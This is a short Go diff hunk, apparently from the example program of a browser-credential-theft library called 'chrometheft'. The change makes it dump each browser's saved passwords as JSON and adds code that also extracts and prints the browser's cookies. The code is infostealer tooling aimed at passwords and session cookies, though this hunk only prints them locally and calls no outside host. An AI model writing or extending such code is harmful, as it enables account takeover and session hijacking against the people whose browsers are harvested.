@@ -21,14 +21,22 @@ func main() {
 	}
 	for _, browser := range browsers {
 		fmt.Println("Browser:", browser)
+
+		fmt.Println("Passwords:")
 		passwords, err := chrometheft.GetPasswords(browser)
 		if err != nil {
 			fmt.Println("Error:", err)
 		}
-		for _, password := range passwords {
-			pwd, _ := json.Marshal(password)
-			fmt.Println(string(pwd))
+		pwd, _ := json.Marshal(passwords)
+		fmt.Println(string(pwd))
+
+		fmt.Println("Cookies:")
+		cookies, err := chrometheft.GetCookies(browser)
+		if err != nil {
+			fmt.Println("Error:", err)
 		}
+		cok, _ := json.Marshal(cookies)
+		fmt.Println(string(cok))
 	}
 }
 ~~~
